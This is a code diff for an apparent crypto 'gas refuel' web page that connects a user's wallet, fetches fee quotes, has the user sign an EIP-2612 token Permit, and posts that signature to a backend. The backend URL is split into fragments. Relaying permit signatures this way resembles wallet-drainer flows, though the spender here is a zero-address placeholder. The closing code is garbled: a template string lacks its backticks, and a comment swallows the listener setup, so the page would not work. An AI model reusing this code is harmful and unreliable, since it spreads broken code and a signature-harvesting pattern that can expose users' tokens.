@@ -53,7 +53,6 @@
         <div class="invoice-box">
             <div class="invoice-row"><span>Across Bridge Fee:</span> <span id="uiBridgeFee">Calculating...</span></div>
             <div class="invoice-row"><span>Gas Spike Buffer (2%):</span> <span id="uiBuffer">Calculating...</span></div>
-            <!-- FIXED: Restored valid opening div layout tag wrapper structure -->
             <div class="invoice-row"><span>PennyGas Fee:</span> <span id="uiProfit">$0.06</span></div>
             <div class="invoice-total"><span>Total Invoice Amount:</span> <span id="uiTotal">Calculating...</span></div>
         </div>
@@ -65,135 +64,147 @@
 </div>
 
 <script>
-    window.addEventListener('load', () => {
-        window.activeUserAddress = "";
+    // Standard direct execution path
+    window.activeUserAddress = "";
 
-        const tokenMatrix = {
-            "1": { "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
-            "42161": { "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDT": "0xFd086b97270535728a370aa7c969c19027158356" }
-        };
+    const tokenMatrix = {
+        "1": { "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
+        "42161": { "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDT": "0xFd086b97270535728a370aa7c969c19027158356" }
+    };
 
-        const BACKEND_BASE = "https://pennygas-backend"; 
-        const BACKEND_DOMAIN = "onrender.com";
-        const BACKEND_URL = `${BACKEND_BASE}.${BACKEND_DOMAIN}`;
+    const BACKEND_BASE = "https://pennygas-backend"; 
+    const BACKEND_DOMAIN = "onrender.com";
+    const BACKEND_URL = `${BACKEND_BASE}.${BACKEND_DOMAIN}`;
 
-        async function fetchLiveInvoiceQuote() {
-            const chainId = document.getElementById('sourceChain').value;
-            const tokenSymbol = document.getElementById('sourceToken').value;
-            const amount = document.getElementById('ethAmount').value;
-            const tokenAddress = tokenMatrix[chainId][tokenSymbol];
-            const currentGasLabel = (chainId === "42161") ? "ARB" : "ETH";
+    async function fetchLiveInvoiceQuote() {
+        const chainId = document.getElementById('sourceChain').value;
+        const tokenSymbol = document.getElementById('sourceToken').value;
+        const amount = document.getElementById('ethAmount').value;
+        const tokenAddress = tokenMatrix[chainId][tokenSymbol];
+        const currentGasLabel = (chainId === "42161") ? "ARB" : "ETH";
 
-            if (!amount || amount <= 0) return;
+        if (!amount || amount <= 0) return;
 
-            try {
-                const targetUrl = `${BACKEND_URL}/api/quote?originChainId=${chainId}&tokenAddress=${tokenAddress}&targetEthAmount=${amount}`;
-                const response = await fetch(targetUrl);
-                const data = await response.json();
+        try {
+            const targetUrl = `${BACKEND_URL}/api/quote?originChainId=${chainId}&tokenAddress=${tokenAddress}&targetEthAmount=${amount}`;
+            const response = await fetch(targetUrl);
+            const data = await response.json();
 
-                if (!data || data.error) {
-                   document.getElementById('uiTotal').innerText = "Route or amount invalid";
-                   return;
-                }
-
-                document.getElementById('uiBridgeFee').innerText = `${data.bridgeFee} ${currentGasLabel}`;
-                document.getElementById('uiBuffer').innerText = `${data.buffer} ${currentGasLabel}`;
-                document.getElementById('uiTotal').innerText = `${data.totalInvoiceEth} ${currentGasLabel}`;
-            } catch (error) {
-                document.getElementById('uiTotal').innerText = "Server link offline";
+            if (!data || data.error) {
+               document.getElementById('uiTotal').innerText = "Route or amount invalid";
+               return;
             }
+
+            document.getElementById('uiBridgeFee').innerText = `${data.bridgeFee} ${currentGasLabel}`;
+            document.getElementById('uiBuffer').innerText = `${data.buffer} ${currentGasLabel}`;
+            document.getElementById('uiTotal').innerText = `${data.totalInvoiceEth} ${currentGasLabel}`;
+        } catch (error) {
+            document.getElementById('uiTotal').innerText = "Server link offline";
+        }
+    }
+
+    async function connectPhantomEVM() {
+        if (typeof window.ethereum === 'undefined') {
+            alert("Phantom Wallet extension not found! Please check your extension settings.");
+            return;
         }
 
-        async function connectPhantomEVM() {
-            if (typeof window.ethereum === 'undefined') {
-                alert("Phantom Wallet extension not found. Please install the extension.");
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            
+            if (!accounts || accounts.length === 0) {
+                alert("No accounts found.");
                 return;
             }
 
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                
-                if (!accounts || accounts.length === 0) {
-                    alert("No accounts found.");
-                    return;
-                }
+            // Correctly extracts the address array element
+            window.activeUserAddress = accounts[0];
+            const displayAddr = window.activeUserAddress;
 
-                window.activeUserAddress = accounts[0];
-                const displayAddr = window.activeUserAddress;
+            document.getElementById('statusMessage').innerText = `🔗 Connected: ${displayAddr.substring(0,6)}...${displayAddr.substring(displayAddr.length - 4)}`;
+            document.getElementById('statusMessage').style.display = 'block';
+            document.getElementById('connectBtn').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            
+            fetchLiveInvoiceQuote();
+        } catch (error) {
+            console.error(error);
+            alert("Connection refused by wallet.");
+        }
+    }
 
-                document.getElementById('statusMessage').innerText = `🔗 Connected: ${displayAddr.substring(0,6)}...${displayAddr.substring(displayAddr.length - 4)}`;
-                document.getElementById('statusMessage').style.display = 'block';
-                document.getElementById('connectBtn').style.display = 'none';
-                document.getElementById('dashboard').style.display = 'block';
-                
-                fetchLiveInvoiceQuote();
-            } catch (error) {
-                console.error(error);
-                alert("Connection refused by wallet.");
-            }
+    async function requestGaslessApproval() {
+        if (!window.activeUserAddress) {
+            alert("Connect your wallet first!");
+            return;
         }
 
-        async function requestGaslessApproval() {
-            if (!window.activeUserAddress) {
-                alert("Connect your wallet first!");
-                return;
-            }
+        const chainId = document.getElementById('sourceChain').value;
+        const tokenSymbol = document.getElementById('sourceToken').value;
+        const tokenAddress = tokenMatrix[chainId][tokenSymbol];
 
-            const chainId = document.getElementById('sourceChain').value;
-            const tokenSymbol = document.getElementById('sourceToken').value;
-            const tokenAddress = tokenMatrix[chainId][tokenSymbol];
+        try {
+            document.getElementById('statusMessage').innerText = "⏳ Requesting gasless permit...";
+            document.getElementById('statusMessage').style.display = 'block';
 
-            try {
-                document.getElementById('statusMessage').innerText = "⏳ Requesting gasless permit...";
-                document.getElementById('statusMessage').style.display = 'block';
+            const pennyGasVaultSpender = "0x0000000000000000000000000000000000000000"; 
+            const nonce = "0x0"; 
+            const deadline = Math.floor(Date.now() / 1000) + 3600; 
+            const hexValue = "0x0000000000000000000000000000000000000000000000000000000000e4e1c0"; 
 
-                const pennyGasVaultSpender = "0x0000000000000000000000000000000000000000"; 
-                const nonce = "0x0"; 
-                const deadline = Math.floor(Date.now() / 1000) + 3600; 
-                const hexValue = "0x0000000000000000000000000000000000000000000000000000000000e4e1c0"; 
+            const msgParams = JSON.stringify({
+                domain: {
+                    name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
+                    version: "2",
+                    chainId: parseInt(chainId),
+                    verifyingContract: tokenAddress
+                },
+                message: {
+                    owner: window.activeUserAddress,
+                    spender: pennyGasVaultSpender,
+                    value: hexValue,
+                    nonce: parseInt(nonce),
+                    deadline: deadline
+                },
+                primaryType: 'Permit',
+                types: {
+                    EIP712Domain: [
+                        { name: 'name', type: 'string' },
+                        { name: 'version', type: 'string' },
+                        { name: 'chainId', type: 'uint256' },
+                        { name: 'verifyingContract', type: 'address' }
+                    ],
+                    Permit: [
+                        { name: 'owner', type: 'address' },
+                        { name: 'spender', type: 'address' },
+                        { name: 'value', type: 'uint256' },
+                        { name: 'nonce', type: 'uint256' },
+                        { name: 'deadline', type: 'uint256' }
+                    ]
+                }
+            });
 
-                const msgParams = JSON.stringify({
-                    domain: {
-                        name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
-                        version: "2",
-                        chainId: parseInt(chainId),
-                        verifyingContract: tokenAddress
-                    },
-                    message: {
-                        owner: window.activeUserAddress,
-                        spender: pennyGasVaultSpender,
-                        value: hexValue,
-                        nonce: parseInt(nonce),
-                        deadline: deadline
-                    },
-                    primaryType: 'Permit',
-                    types: {
-                        EIP712Domain: [
-                            { name: 'name', type: 'string' },
-                            { name: 'version', type: 'string' },
-                            { name: 'chainId', type: 'uint256' },
-                            { name: 'verifyingContract', type: 'address' }
-                        ],
-                        Permit: [
-                            { name: 'owner', type: 'address' },
-                            { name: 'spender', type: 'address' },
-                            { name: 'value', type: 'uint256' },
-                            { name: 'nonce', type: 'uint256' },
-                            { name: 'deadline', type: 'uint256' }
-                        ]
-                    }
-                });
+            const signature = await window.ethereum.request({
+                method: 'eth_signTypedData_v4',
+                params: [window.activeUserAddress, msgParams]
+            });
 
-                const signature = await window.ethereum.request({
-                    method: 'eth_signTypedData_v4',
-                    params: [window.activeUserAddress, msgParams]
-                });
+            document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend...";
 
-                document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend...";
-
-                const response = await fetch(`${BACKEND_URL}/api/submit-permit`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        owner: window.activeUserAddress,
-spender: pennyGasVaultSpender,value: hexValue,deadline: deadline,signature: signature})});const result = await response.json();if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}document.getElementById('connectBtn').addEventListener('click', connectPhantomEVM);document.getElementById('requestBtn').addEventListener('click', requestGaslessApproval);document.getElementById('sourceChain').addEventListener('change', fetchLiveInvoiceQuote);document.getElementById('sourceToken').addEventListener('change', fetchLiveInvoiceQuote);document.getElementById('ethAmount').addEventListener('input', fetchLiveInvoiceQuote);});
+            const response = await fetch(`${BACKEND_URL}/api/submit-permit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    owner: window.activeUserAddress,
+                    spender: pennyGasVaultSpender,
+                    value: hexValue,
+                    deadline: deadline,
+                    signature: signature
+                })
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";
+            } else {
+document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}// Attach listeners directly on load executiondocument.getElementById('connectBtn').addEventListener('click', connectPhantomEVM);document.getElementById('requestBtn').addEventListener('click', requestGaslessApproval);document.getElementById('sourceChain').addEventListener('change', fetchLiveInvoiceQuote);document.getElementById('sourceToken').addEventListener('change', fetchLiveInvoiceQuote);document.getElementById('ethAmount').addEventListener('input', fetchLiveInvoiceQuote);
